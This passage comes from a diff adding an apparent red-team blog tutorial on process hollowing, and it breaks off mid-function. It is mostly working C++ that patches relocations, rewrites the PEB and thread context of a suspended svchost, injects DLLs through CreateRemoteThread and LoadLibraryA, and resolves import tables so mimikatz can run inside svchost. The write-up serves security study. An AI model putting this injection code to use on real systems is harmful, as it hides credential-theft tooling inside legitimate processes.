+        <span class="k">for</span> <span class="p">(</span><span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NumberOfEntries</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">PBASE_RELOCATION_ENTRY</span> <span class="n">currentRelocEntry</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBASE_RELOCATION_ENTRY</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">peToInjectContent</span> <span class="o">+</span> <span class="n">peToInjectRelocSection</span><span class="o">-&gt;</span><span class="n">PointerToRawData</span> <span class="o">+</span> <span class="n">RelocOffset</span><span class="p">);</span>
+            <span class="n">RelocOffset</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">BASE_RELOCATION_ENTRY</span><span class="p">);</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="n">currentRelocEntry</span><span class="o">-&gt;</span><span class="n">Type</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+                <span class="k">continue</span><span class="p">;</span>
+
+            <span class="n">PVOID</span> <span class="n">AddressLocation</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">currentReloc</span><span class="o">-&gt;</span><span class="n">PageAddress</span> <span class="o">+</span> <span class="n">currentRelocEntry</span><span class="o">-&gt;</span><span class="n">Offset</span><span class="p">;</span>
+            <span class="n">PBYTE</span> <span class="n">PatchedAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">AddressLocation</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">PatchedAddress</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="nb">nullptr</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot read target process memory at %p, ERROR CODE: %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">AddressLocation</span><span class="p">),</span> <span class="n">GetLastError</span><span class="p">());</span>
+                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Address To Patch: %p -&gt; Address Patched: %p </span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">VOID</span><span class="o">*</span><span class="p">)</span><span class="n">PatchedAddress</span><span class="p">,</span> <span class="p">(</span><span class="n">VOID</span><span class="o">*</span><span class="p">)(</span><span class="n">PatchedAddress</span> <span class="o">+</span> <span class="n">DeltaImageBase</span><span class="p">));</span>
+
+            <span class="n">PatchedAddress</span> <span class="o">+=</span> <span class="n">DeltaImageBase</span><span class="p">;</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">AddressLocation</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">PatchedAddress</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="nb">nullptr</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot write into target process memory at %p, ERROR CODE: %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">AddressLocation</span><span class="p">),</span> <span class="n">GetLastError</span><span class="p">());</span>
+                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><img src="assets/img/posts/20240124/Reloc.png" alt="Relocation phase" /></p>
+
+<h3 id="changing-the-entrypoint-and-resuming-the-execution">Changing the entrypoint and resuming the execution</h3>
+
+<p>After the relocation phase done. The last step is to change the address of the register RCX of the remote process thread context with the address of the entrypoint of the injected PE. Also it is needed to change the address of the Image Base Address included in the PEB which is contained in the RDX register.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">CONTEXT</span> <span class="n">CTX</span> <span class="o">=</span> <span class="p">{};</span>
+<span class="n">CTX</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_FULL</span><span class="p">;</span>
+
+<span class="c1">// Retrieve main thread context of the remote process
+</span>
+<span class="n">BOOL</span> <span class="n">bGetContext</span> <span class="o">=</span> <span class="n">GetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CTX</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bGetContext</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[-] An error occured when trying to get the thread context.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Overwrite the Image Base Address inside the PEB
+</span>
+<span class="c1">// PEB @ RDX
+</span>
+<span class="c1">// PPEB-&gt;ImageBaseAddress = PPEB+0x10
+</span>
+<span class="n">BOOL</span> <span class="n">bWritePEB</span> <span class="o">=</span> <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">CTX</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">peInjectNtHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="nb">nullptr</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bWritePEB</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[-] An error occured when trying to write the image base in the PEB.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Overwrite RCX with the address of the injected PE entry point
+</span>
+<span class="n">CTX</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">peInjectNtHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span><span class="p">;</span>
+
+<span class="n">BOOL</span> <span class="n">bSetContext</span> <span class="o">=</span> <span class="n">SetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CTX</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSetContext</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[-] An error occured when trying to set the thread context.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Resume the thread
+</span>
+<span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hThread</span><span class="p">);</span></code></pre></figure>
+
+<p><img src="assets/img/posts/20240124/PHBasic.png" alt="Basic Process Hollowing" /></p>
+
+<p>Once the thread resumed, we obtain our calc.exe. However, if we change the injected PE with a binary which has an IAT such as <code class="language-plaintext highlighter-rouge">mimikatz</code>, we can observe that the process crashes because it lacks the dependancies.</p>
+
+<p><img src="assets/img/posts/20240124/mimikatzIATLess.png" alt="Basic Process Hollowing with Mimikatz" /></p>
+
+<p>We now need to resolve the mimikatz IAT to be able to execute it without any crash.</p>
+
+<p><img src="assets/img/posts/20240124/mimikatzIAT.png" alt="Mimiaktz IAT" /></p>
+
+<h2 id="make-the-remote-process-load-the-required-libraries">Make the remote process load the required libraries</h2>
+
+<h3 id="load-an-arbitrary-dll-in-a-remote-process">Load an arbitrary DLL in a remote process</h3>
+
+<p>Having established a basic process hollowing code, our objective is to enhance it to be able to load any PE. We will use the binary <code class="language-plaintext highlighter-rouge">mimikatz</code> as our injected PE, while maintaining the <code class="language-plaintext highlighter-rouge">svchost</code> binary as the remote process into which we intend to inject <code class="language-plaintext highlighter-rouge">mimikatz</code>.</p>
+
+<p>The first step is a common technic used to make a remote process load an arbitrary DLL:</p>
+<ul>
+  <li>Allocate memory in the remote process</li>
+  <li>Write the name of the DLL inside the remote process in our newly allocated memory</li>
+  <li>Create a remote thread on <code class="language-plaintext highlighter-rouge">LoadLibrary</code> function with our DLL name as argument.</li>
+</ul>
+
+<p>We can determine the address of <code class="language-plaintext highlighter-rouge">LoadLibraryA</code>, because every process on a Windows system has the same addresses for the libraries <code class="language-plaintext highlighter-rouge">ntdll.dll</code> and <code class="language-plaintext highlighter-rouge">kernel32.dll</code> which are automaticaly loaded. Since <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> is declared in <code class="language-plaintext highlighter-rouge">kernel32.dll</code>, we only need to resolve the address of <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> in our process and it will be the exact same address in the remote process.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">remoteLoadLibrary</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">PCHAR</span> <span class="n">libToLoad</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">PVOID</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">libToLoad</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">addr</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"Error allocating memory into process 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">libToLoad</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">libToLoad</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"Error in writing into process @0x%p -&gt; 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">PVOID</span> <span class="n">loadlib</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="s">"LoadLibraryA"</span><span class="p">);</span>
+    <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">loadlib</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="n">or</span> <span class="o">!</span><span class="n">hThread</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"Error in creating remote thread 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Let’s try our function to make our <code class="language-plaintext highlighter-rouge">svchost</code> process load <code class="language-plaintext highlighter-rouge">winhttp.dll</code> for example.<br />
+<img src="assets/img/posts/20240124/SvcHostBreak.png" alt="svchost launched in suspended" />
+When we look at the process launched in suspended state, we can observe that only the <code class="language-plaintext highlighter-rouge">ntdll.dll</code> is loaded.<br />
+But if we call our function, we will observe that <code class="language-plaintext highlighter-rouge">winhttp.dll</code> will be sucessfuly loaded.</p>
+
+<p><img src="assets/img/posts/20240124/svcHostLoad.png" alt="svchost with winhttp.dll" /></p>
+
+<p>The other loaded dll are the libraries needed by the legitimate <code class="language-plaintext highlighter-rouge">svchost</code> process.</p>
+
+<h3 id="resolve-injected-pe-iat-to-make-the-remote-process-load-all-the-dependencies">Resolve injected PE IAT to make the remote process load all the dependencies</h3>
+
+<p>Now that we have a method to make the remote process load arbitrary DLLs, we now need to parse our injected PE to retrieve all its dependancies.<br />
+When a PE is loaded, there is a difference in addresses between the PE on the disk and the PE in memory. For example, when we copy our PE sections, we retrieve the section through the attribute <code class="language-plaintext highlighter-rouge">PointerToRawData</code> but the destination use the attribute <code class="language-plaintext highlighter-rouge">VirtualAddress</code>. When we open our binary in <code class="language-plaintext highlighter-rouge">PE Bear</code>, we can easily observe that there is a difference in the section mapping when it is on the disk and when it is loaded in memory.</p>
+
+<p><img src="assets/img/posts/20240124/SectionDiff.png" alt="Section Mapping diff" /></p>
+
+<p>Since the IAT is located in the <code class="language-plaintext highlighter-rouge">.rdata</code> section, if we retrieve it like we would have done when performing reflective loading, we won’t be able to get it since there is an offset between our PE read from the disk and the PE that is loaded in memory. Therefore, in a first time we will modify slightly our function <code class="language-plaintext highlighter-rouge">copyPEinTargetProcess</code> to be able to retrieve the <code class="language-plaintext highlighter-rouge">.rdata</code> offset between the <code class="language-plaintext highlighter-rouge">PointerToRawData</code> and the <code class="language-plaintext highlighter-rouge">VirtualAddress</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">copyPEinTargetProcess</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">pHandle</span><span class="p">,</span> <span class="n">PVOID</span><span class="o">&amp;</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">peInjectNtHeaders</span><span class="p">,</span> <span class="n">PIMAGE_SECTION_HEADER</span><span class="o">&amp;</span> <span class="n">peToInjectRelocSection</span><span class="p">,</span> <span class="n">PDWORD</span> <span class="n">offsetRdata</span><span class="p">)</span>
+<span class="p">{</span>
+
+    <span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span><span class="p">;</span>
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Writing Header into target process</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfHeaders</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot write headers inside the target process. ERROR Code: %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Headers written at : 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">);</span>
+
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Writing section into target process</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">PIMAGE_SECTION_HEADER</span> <span class="n">currentSectionHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_SECTION_HEADER</span><span class="p">)((</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">peInjectNtHeaders</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_FILE_HEADER</span><span class="p">)</span> <span class="o">+</span> <span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">SizeOfOptionalHeader</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_SECTION_HEADER</span><span class="p">)));</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="s">".reloc"</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">peToInjectRelocSection</span> <span class="o">=</span> <span class="n">currentSectionHeader</span><span class="p">;</span>
+            <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Reloc table found @ 0x%p offset</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)(</span><span class="n">UINT64</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">peToInjectContent</span> <span class="o">+</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">PointerToRawData</span><span class="p">),</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">SizeOfRawData</span><span class="p">,</span> <span class="nb">nullptr</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot write section %s in the target process. ERROR Code: %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Section %s written at : 0x%p.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">LPSTR</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">));</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="s">".rdata"</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="o">*</span><span class="n">offsetRdata</span> <span class="o">=</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span> <span class="o">-</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">PointerToRawData</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="s">".text"</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">DWORD</span> <span class="n">oldProtect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">),</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">SizeOfRawData</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="n">_err</span><span class="p">(</span><span class="s">"Error in changing permissions on .text sections to RX -&gt; 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Permissions changed to RX on .text section </span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="p">}</span>
+
+
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The function now takes an additional argument that is a pointer to a <code class="language-plaintext highlighter-rouge">DWORD</code> to be able to retrieve the offset of <code class="language-plaintext highlighter-rouge">rdata</code> section.<br />
+Now let’s create a little function to test if we can resolve <code class="language-plaintext highlighter-rouge">mimikatz</code> IAT. To resolve it we need to get a pointer to the first import descriptor (do not forget to apply the <code class="language-plaintext highlighter-rouge">.rdata</code> offset when we compute the address) <code class="language-plaintext highlighter-rouge">PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pImage + importsDirectory.VirtualAddress - offsetRdata );</code>. And then we need to iterate until the structure is empty to retrieve all libraries in the IAT.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">loadImportTableLibs</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">pImage</span><span class="p">,</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">ntHeaders</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">offsetRdata</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">PIMAGE_IMPORT_DESCRIPTOR</span> <span class="n">importDescriptor</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">IMAGE_DATA_DIRECTORY</span> <span class="n">importsDirectory</span> <span class="o">=</span> <span class="n">ntHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">importsDirectory</span><span class="p">.</span><span class="n">Size</span> <span class="o">&lt;=</span> <span class="mi">20</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[*] Empty IAT"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="n">importDescriptor</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_IMPORT_DESCRIPTOR</span><span class="p">)(</span><span class="n">importsDirectory</span><span class="p">.</span><span class="n">VirtualAddress</span> <span class="o">-</span> <span class="n">offsetRdata</span> <span class="o">+</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pImage</span><span class="p">);</span>
+
+
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[*] Get Import Directory Table at %p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">importDescriptor</span><span class="p">);</span>
+
+    <span class="n">LPSTR</span> <span class="n">libName</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">HMODULE</span> <span class="n">lib</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="n">importDescriptor</span><span class="o">-&gt;</span><span class="n">Name</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">libName</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPSTR</span><span class="p">)(</span><span class="n">importDescriptor</span><span class="o">-&gt;</span><span class="n">Name</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">pImage</span> <span class="o">-</span> <span class="n">offsetRdata</span><span class="p">);</span>
+
+        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[*] library to load: %s</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">libName</span><span class="p">);</span>
+    
+        <span class="n">importDescriptor</span><span class="o">++</span><span class="p">;</span>
+
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><img src="assets/img/posts/20240124/IATResolve.png" alt="Resolving mimikatz IAT" /></p>
+
+<p>As observed, we can resolve mimikatz IAT. Now we can apply our function <code class="language-plaintext highlighter-rouge">remoteLoadLibrary</code> in the function to make our remote process load our dependancies.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">loadImportTableLibs</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">pImage</span><span class="p">,</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">ntHeaders</span><span class="p">,</span> <span class="n">LPPROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">offsetRdata</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="p">...</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="n">importDescriptor</span><span class="o">-&gt;</span><span class="n">Name</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
